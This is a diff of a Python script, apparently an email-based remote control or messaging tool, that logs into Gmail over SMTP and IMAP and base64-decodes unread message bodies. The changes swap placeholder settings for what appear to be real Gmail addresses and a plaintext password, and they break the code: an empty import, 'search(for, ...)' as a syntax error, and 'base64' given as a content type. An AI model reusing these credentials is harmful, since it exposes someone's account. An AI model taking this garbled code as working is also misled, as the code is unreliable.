@@ -4,7 +4,7 @@ import imaplib
 import os
 import platform
 import smtplib
-import time
+import 
 import random
 print("[*] Checking Requirements Module.....")
 if platform.system().startswith("Linux"):
@@ -64,10 +64,10 @@ def logo():
     print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
     catc()
 smtpserver="smtp.gmail.com"
-smtpuser="Your_1st_gmail@gmail.com" 
-smtpkey="your_1st_gmail_app_password"
+smtpuser="bellaa2anna@gmail.com" 
+smtpkey="Ghostilany1$"
 imapserver="imap.gmail.com"
-imapboy="your_2nd_gmail@gmail.com"
+imapboy="davidreaves411@gmail.com"
 
 def catc():
     try:
@@ -100,14 +100,14 @@ def read_result():
     message=imaplib.IMAP4_SSL(imapserver)
     message.login(smtpuser,smtpkey)
     message.select("inbox")
-    _, data=message.search(None, "UNSEEN")
+    _, data=message.search(for, "UNSEEN")
 
     for x in data[0].split():
         _, msg=message.fetch(x, '(RFC822)')
         _, g=msg[0]
         data_email= email.message_from_bytes(g)
         for m in data_email.walk():
-            if m.get_content_type() == "text/plain":
+            if m.get_content_type() == "base64":
                 body=m.get_payload(decode=True)
                 message=body.decode("utf-8")
                 message_bytes = base64.b64decode(message + '=' * (-len(message) % 4))
